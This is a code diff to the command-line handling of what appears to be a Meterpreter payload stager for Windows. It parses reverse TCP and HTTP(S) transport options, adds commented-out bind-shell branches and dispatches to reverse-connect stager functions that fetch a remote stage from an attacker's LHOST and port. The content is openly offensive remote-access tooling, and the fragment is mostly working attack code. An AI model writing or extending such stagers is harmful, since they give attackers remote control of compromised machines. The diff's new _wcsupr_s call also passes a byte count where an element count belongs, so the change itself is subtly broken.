@@ -69,7 +69,7 @@ int wmain(int argc, wchar_t *argv[])
 		if (i != argc) // Check that we haven't finished parsing already
 			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_tcp, reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
 				payload_settings.TRANSPORT = argv[i + 1];
-				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
+				_wcsupr_s(payload_settings.TRANSPORT, wcslen(payload_settings.TRANSPORT) * sizeof(wchar_t)); // Wide-String-to-uppercase
 				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
@@ -87,8 +87,22 @@ int wmain(int argc, wchar_t *argv[])
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
 				}
+
+				/* starting bind tcp */
+				/*else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
+				{
+					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP";
+				}*/
+
+				/* metsvc_bind_tcp */
+				/*else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP_METSVC") == 0)
+				{
+					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP_SSL";
+					metsvc = true;
+				}*/
+
 				else {
-					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http and reverse_https.\n", payload_settings.TRANSPORT);
+					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http,\n    reverse_https, bind_tcp and bind_tcp_metsvc.\n", payload_settings.TRANSPORT);
 					exit(0);
 				}
 				// End of Transport checks
@@ -134,7 +148,7 @@ int wmain(int argc, wchar_t *argv[])
 			FallbackToStager = true; // We will function in "stager" mode.
 			if(metsvc) // Ok, we will fallback to stager mode, however, metsvc will not be available in stager mode ... right?
 			{
-				dprintf(L"\n[-] Unable to load stage from resource, and \"-f\" not specified ... yet you've chosen reverse_metsvc!\n");
+				dprintf(L"\n[-] Unable to load stage from resource, and \"-f\" not specified ... yet you've chosen %s!\n",payload_settings.TRANSPORT);
 				dprintf(L"    sorry sweetheart, that's not going to work, metsvc *requires* that the stage is available upfront.\n");
 				dprintf(L"[-] Use inmet.exe, use \"reverse_tcp\", use another transport, or bundle this exe with metsvc.dll.\n"
 					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
@@ -193,7 +207,20 @@ int wmain(int argc, wchar_t *argv[])
 		{
 			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
 		} 
-		else 
+
+		/* bind_tcp */
+		/*else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
+		{
+			StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
+		}*/  
+
+		/* bind_tcp_ssl */
+		/*else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP_SSL") == 0)
+		{
+			StagerBindTCPSSL(payload_settings.LHOST,payload_settings.LPORT);
+		}*/ 
+
+		else
 		{
 			StagerReverseHTTP(payload_settings.LHOST,payload_settings.LPORT,payload_settings.TRANSPORT);
 		}
